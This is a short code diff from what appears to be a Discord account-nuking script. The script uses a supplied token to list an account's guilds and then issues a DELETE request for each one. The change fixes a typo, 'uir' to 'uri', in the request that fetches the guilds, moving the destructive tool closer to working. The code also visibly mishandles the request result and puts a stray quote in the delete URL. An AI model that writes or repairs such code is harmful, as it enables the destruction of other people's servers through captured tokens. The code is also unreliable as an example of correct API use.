@@ -24,7 +24,7 @@ async function GANGDOTJS_START(token_, Server_name, message_Content) {
             console.log(err)
         }
     }
-    const guildsids = request.get({uir: "https://discord.com/api/v9/users/@me/guilds", headers:getheaders(token)}, function(error,responce,body) {if(error) {console.log(error)}})
+    const guildsids = request.get({uri: "https://discord.com/api/v9/users/@me/guilds", headers:getheaders(token)}, function(error,responce,body) {if(error) {console.log(error)}})
     for(guild in guildsids) {
         try {
             request.delete({uri: `https://discord.com/api/v8/guilds/'${guild.id}`, headers: headers}, function(error,responce,body) {
